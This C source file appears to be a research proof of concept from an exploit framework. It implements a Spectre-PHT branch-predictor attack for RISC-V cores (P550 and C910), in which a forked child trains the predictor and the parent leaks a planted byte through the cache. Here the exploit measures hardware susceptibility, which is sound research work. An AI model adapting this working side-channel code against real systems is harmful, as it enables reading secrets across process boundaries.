#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT ca-ip: cross-address in-place via fork
// Child trains with in-bounds, parent attacks with OOB (shared PHT state)

// Platform-specific tuning: P550 needs concurrent train+attack with more iterations
#ifdef P550
#define CHILD_TRAIN_ITERS 1000
#define PARENT_ATTACK_ITERS 100
#define SYNC_ROUNDS 20
#else
#define CHILD_TRAIN_ITERS 100
#define PARENT_ATTACK_ITERS 20
#define SYNC_ROUNDS 1
#endif

// Sync flags for deterministic interleaving (P550)
#define SYNC_FLAG(ctx) ((volatile uint8_t*)((ctx)->shared_secret + 1))
#define SYNC_IDLE 0
#define SYNC_CHILD_GO 1
#define SYNC_CHILD_DONE 2

#define BENIGN_SIZE PAGE_SIZE

volatile int buf_size = BENIGN_SIZE;
uint8_t* probe_array;

struct evset_pages {
    uint8_t page_barrier1[PAGE_SIZE];
    uint8_t victim[PAGE_SIZE];
    uint8_t page_barrier2[PAGE_SIZE];
    uint8_t secret_data[PAGE_SIZE];
    uint8_t page_barrier3[PAGE_SIZE];
} __attribute__((aligned(PAGE_SIZE))) evset_pages;

uint8_t *const page_barrier1 = evset_pages.page_barrier1;
uint8_t *const victim        = evset_pages.victim;
uint8_t *const page_barrier2 = evset_pages.page_barrier2;
uint8_t *const secret_data   = evset_pages.secret_data;
uint8_t *const page_barrier3 = evset_pages.page_barrier3;

void __attribute__((noinline)) victim_function(int idx) {
    if (idx >= 0 && idx < STALL(buf_size)) {
        SPEC_FENCE();
        maccess(probe_array + victim[idx] * PAGE_SIZE);
    }
}

typedef struct {
    int secret_offset;
    int training_x;
    int iteration_counter;
#ifdef CACHEUTILS_USE_EVICTION
    eviction_set_t buf_size_set;
#endif
} pht_ca_ip_data_t;

void pht_ca_ip_setup(exploit_ctx_t* ctx, void* data) {
    *SYNC_FLAG(ctx) = SYNC_IDLE;

    memset(victim, 0x01, PAGE_SIZE);
    memset(page_barrier1, 0x01, PAGE_SIZE);
    memset(page_barrier2, 0x01, PAGE_SIZE);
    memset(page_barrier3, 0x01, PAGE_SIZE);
    memset(secret_data, 0xFF, PAGE_SIZE);

    ctx->exclude_enabled = true;
    ctx->exclude_value = 0x01;

#ifdef CACHEUTILS_USE_EVICTION
    pht_ca_ip_data_t* pht_data = (pht_ca_ip_data_t*)data;
    if (build_eviction_set_vaddr((void*)&buf_size, &pht_data->buf_size_set) != 0) {
        fprintf(stderr, "Failed to build eviction set for buf_size\n");
        exit(1);
    }
    printf("buf_size eviction set: %d addresses\n", pht_data->buf_size_set.num_addrs);
#endif
}

#ifdef P550
// P550: Synchronized concurrent train+attack pattern
void pht_ca_ip_child_loop(exploit_ctx_t* ctx, void* data) {
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    while (1) {
        // Wait for parent signal
        for (int wait = 0; wait < 100000 && *sync != SYNC_CHILD_GO; wait++) {
            asm volatile("" ::: "memory");
        }
        if (*sync != SYNC_CHILD_GO) return;

        // Train: call victim_function with in-bounds index
        for (int j = 0; j < CHILD_TRAIN_ITERS; j++) {
            victim_function(0);
        }

        *sync = SYNC_CHILD_DONE;
        mfence();
    }
}

void pht_ca_ip_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_ca_ip_data_t* pht_data = (pht_ca_ip_data_t*)data;
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    secret_data[0] = encode_index;

    for (int round = 0; round < SYNC_ROUNDS; round++) {
        *sync = SYNC_CHILD_GO;
        mfence();

        // Attack concurrently while child trains
        for (int j = 0; j < PARENT_ATTACK_ITERS; j++) {
            evict_with_set(&pht_data->buf_size_set);
            mfence();
            victim_function(pht_data->secret_offset);
        }

        // Wait for child to finish
        for (int wait = 0; wait < 100000 && *sync != SYNC_CHILD_DONE; wait++) {
            asm volatile("" ::: "memory");
        }
        *sync = SYNC_IDLE;
    }
}

#else
// C910: Simple training pattern (original)
void pht_ca_ip_child_loop(exploit_ctx_t* ctx, void* data) {
    for (int j = 0; j < CHILD_TRAIN_ITERS; j++) {
        victim_function(0);
    }
}

void pht_ca_ip_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_ca_ip_data_t* pht_data = (pht_ca_ip_data_t*)data;

    secret_data[0] = encode_index;

    for (int j = 0; j < PARENT_ATTACK_ITERS; j++) {
        flush((void*)&buf_size);
        mfence();
        victim_function(pht_data->secret_offset);
    }
}
#endif

int main() {
    exploit_ctx_t ctx = {0};
    pht_ca_ip_data_t pht_data;
    memset(&pht_data, 0, sizeof(pht_data));

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-PHT ca-ip\n");

    pht_data.secret_offset = secret_data - victim;
    pht_data.training_x = 0;

    exploit_hooks_t hooks = {
        .setup = pht_ca_ip_setup,
        .cleanup = NULL,
        .attack = NULL,
        .attacker_thread = NULL,
        .victim_thread = NULL,
        .pre_measure = NULL,
        .child_loop = pht_ca_ip_child_loop,
        .parent_attack = pht_ca_ip_parent_attack
    };

    exploit_run(&ctx, &hooks, &pht_data);
    exploit_print_results("PHT cross-address in-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
